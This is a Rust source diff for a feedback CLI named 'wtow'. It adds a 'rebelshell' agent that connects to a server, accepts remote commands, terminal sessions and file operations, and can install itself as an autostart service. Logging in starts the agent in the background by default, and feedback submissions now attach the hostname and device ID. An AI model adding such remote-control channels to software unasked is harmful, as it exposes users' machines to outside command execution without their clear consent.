@@ -9,6 +9,8 @@ use reqwest::blocking::{Client, RequestBuilder, Response, multipart};
 use serde::{Deserialize, Serialize};
 use serde_json::{Value, json};
 
+mod agent;
+
 const VERSION: &str = env!("CARGO_PKG_VERSION");
 const SKILL_FILES: &[(&str, &str)] = &[
     ("SKILL.md", include_str!("../skill/SKILL.md")),
@@ -58,11 +60,22 @@ enum Cmd {
     Login {
         #[arg(long)]
         profile: Option<String>,
+        /// 反馈中心（rebelshell 服务端）地址，形如 `10.0.0.5:9705`。
+        /// 登录后会把 Agent 拉到后台；不提供则沿用环境变量或上次保存的地址。
+        #[arg(long)]
+        rebelshell_server: Option<String>,
+        /// 只保存 CLI 凭证，不在后台启动反馈终端 Agent。
+        #[arg(long)]
+        no_agent: bool,
     },
     Whoami,
     Profile {
         #[command(subcommand)]
         cmd: ProfileCmd,
+    },
+    Agent {
+        #[command(subcommand)]
+        cmd: AgentCmd,
     },
     Skill {
         #[command(subcommand)]
@@ -80,6 +93,30 @@ enum Cmd {
         #[command(subcommand)]
         cmd: FileCmd,
     },
+}
+
+#[derive(Subcommand)]
+enum AgentCmd {
+    /// 前台运行：连上反馈中心，接受命令、交互式终端与文件操作
+    Run {
+        #[arg(long)]
+        server: Option<String>,
+        #[arg(long)]
+        uuid: Option<String>,
+        #[arg(long)]
+        heartbeat: Option<u64>,
+        #[arg(long)]
+        dir: Option<PathBuf>,
+    },
+    /// 安装为开机自启的后台服务（Windows 需管理员，Linux 需 root）
+    Install {
+        #[arg(long)]
+        server: Option<String>,
+        #[arg(long)]
+        uuid: Option<String>,
+    },
+    /// 卸载后台服务
+    Uninstall,
 }
 
 #[derive(Subcommand)]
@@ -293,6 +330,9 @@ struct Profile {
 #[derive(Default, Serialize, Deserialize)]
 struct UserConfig {
     active: Option<String>,
+    /// 反馈中心（rebelshell 服务端）地址，登录时保存，供后台 Agent 复用。
+    #[serde(default)]
+    rebelshell_server: Option<String>,
     #[serde(default)]
     profiles: BTreeMap<String, Profile>,
 }
@@ -705,7 +745,12 @@ fn main() {
     let cli = Cli::parse();
     let g = &cli.g;
     match &cli.cmd {
-        Cmd::Login { profile } => login(g, profile.clone()),
+        Cmd::Login {
+            profile,
+            rebelshell_server,
+            no_agent,
+        } => login(g, profile.clone(), rebelshell_server.clone(), *no_agent),
+        Cmd::Agent { cmd } => agent_cmd(g, cmd),
         Cmd::Profile { cmd } => profile_cmd(g, cmd),
         Cmd::Skill {
             cmd: SkillCmd::Install { scope, dir },
@@ -737,7 +782,7 @@ fn main() {
     }
 }
 
-fn login(g: &Global, profile: Option<String>) {
+fn login(g: &Global, profile: Option<String>, rebelshell_server: Option<String>, no_agent: bool) {
     let (Some(base_url), Some(project), Some(token)) = (&g.base_url, &g.project, &g.token) else {
         fail(
             6,
@@ -764,8 +809,110 @@ fn login(g: &Global, profile: Option<String>) {
         },
     );
     cfg.active = Some(name.clone());
+    if let Some(server) = &rebelshell_server {
+        cfg.rebelshell_server = Some(server.clone());
+    }
+    let rebelshell = cfg.rebelshell_server.clone();
     save_user_config(&cfg, g.json);
-    print(&json!({ "profile": name, "whoami": me }), g.json);
+
+    // 登录顺手接上反馈终端：后台拉起 Agent，wtow 退出后连接仍在。
+    // 没配置地址时只给一句提示，不影响登录本身。
+    let mut agent_report = json!({ "started": false });
+    if no_agent {
+        agent_report["hint"] = json!("--no-agent：未启动反馈终端");
+    } else if let Some(server) = rebelshell {
+        match agent::spawn_background(&server) {
+            Ok(()) => agent_report = json!({ "started": true, "server": server }),
+            Err(err) => agent_report["error"] = json!(err),
+        }
+    } else {
+        agent_report["hint"] =
+            json!("未配置反馈中心地址；重跑 login 时加 --rebelshell-server <host:port>");
+    }
+    print(
+        &json!({ "profile": name, "whoami": me, "agent": agent_report }),
+        g.json,
+    );
+}
+
+/// 反馈终端地址：参数 > 环境变量 > 用户配置。返回 None 时由调用方报错。
+fn rebelshell_server(flag: Option<&String>, cfg: &UserConfig) -> Option<String> {
+    flag.cloned()
+        .or_else(|| std::env::var("WTOW_REBELSHELL_SERVER").ok())
+        .filter(|v| !v.trim().is_empty())
+        .or_else(|| cfg.rebelshell_server.clone())
+}
+
+fn agent_cmd(g: &Global, cmd: &AgentCmd) {
+    let cfg = load_user_config();
+    match cmd {
+        AgentCmd::Run {
+            server,
+            uuid,
+            heartbeat,
+            dir,
+        } => {
+            let Some(server) = rebelshell_server(server.as_ref(), &cfg) else {
+                fail(
+                    6,
+                    g.json,
+                    "VALIDATION",
+                    "missing feedback server; use: wtow agent run --server <host:port>",
+                )
+            };
+            let uuid = match uuid.clone() {
+                Some(uuid) => uuid,
+                None => agent::config::load_or_create_uuid()
+                    .unwrap_or_else(|err| fail(1, g.json, "CONFIG", &err)),
+            };
+            let config = agent::config::AgentConfig {
+                server,
+                uuid,
+                heartbeat_secs: heartbeat.unwrap_or(10).max(1),
+                workdir: dir.clone().unwrap_or_else(|| {
+                    std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."))
+                }),
+            };
+            if let Err(err) = agent::run(config) {
+                fail(1, g.json, "AGENT", &err);
+            }
+        }
+        AgentCmd::Install { server, uuid } => {
+            let Some(server) = rebelshell_server(server.as_ref(), &cfg) else {
+                fail(
+                    6,
+                    g.json,
+                    "VALIDATION",
+                    "missing feedback server; use: wtow agent install --server <host:port>",
+                )
+            };
+            let uuid = match uuid.clone() {
+                Some(uuid) => uuid,
+                None => agent::config::load_or_create_uuid()
+                    .unwrap_or_else(|err| fail(1, g.json, "CONFIG", &err)),
+            };
+            let args = vec!["--server".to_string(), server, "--uuid".to_string(), uuid];
+            match agent::service::install(&args) {
+                Ok(()) => print(&json!({ "installed": true }), g.json),
+                Err(err) => fail(1, g.json, "SERVICE", &err),
+            }
+        }
+        AgentCmd::Uninstall => match agent::service::uninstall() {
+            Ok(()) => print(&json!({ "installed": false }), g.json),
+            Err(err) => fail(1, g.json, "SERVICE", &err),
+        },
+    }
+}
+
+/// 提交反馈时自动附带的环境上下文。字段都可能缺失，反馈中心按可选处理。
+fn client_context() -> Value {
+    json!({
+        "source": "cli",
+        "hostname": agent::config::hostname(),
+        "os": agent::execute::os_type(),
+        "device_id": agent::config::existing_uuid(),
+        "cli_version": VERSION,
+    })
 }
 
 fn profile_cmd(g: &Global, cmd: &ProfileCmd) {
@@ -845,7 +992,16 @@ fn raw_cmd(api: &Api, cmd: &RawCmd) -> Value {
         RawCmd::Submit { title, desc, tags, attach } => {
             let ids = api.upload(attach);
             let desc = link_uploads(desc, attach, &ids);
-            api.post("/raw", json!({ "title": title, "description": desc, "tags": tags, "attachment_ids": ids }))
+            api.post(
+                "/raw",
+                json!({
+                    "title": title,
+                    "description": desc,
+                    "tags": tags,
+                    "attachment_ids": ids,
+                    "client_context": client_context(),
+                }),
+            )
         }
         RawCmd::List { status, tag, q, mine, page, page_size } => api.get("/raw", &[
             ("status", status.clone()),
